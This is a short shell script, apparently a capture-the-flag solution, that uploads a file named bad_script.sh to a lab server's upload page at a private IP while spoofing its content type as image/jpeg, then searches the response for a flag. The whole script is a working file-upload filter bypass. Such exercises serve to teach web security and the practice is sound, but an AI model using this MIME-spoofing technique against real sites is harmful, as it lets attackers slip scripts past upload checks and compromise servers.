ip="192.168.56.105"
script="/tmp/bad_script.sh"

touch "$script"
curl -s -X POST "$ip/index.php?page=upload" \
	-F "uploaded=@$script;type=image/jpeg" \
	-F "Upload=Upload"  \
	| grep 'flag'

rm "$script"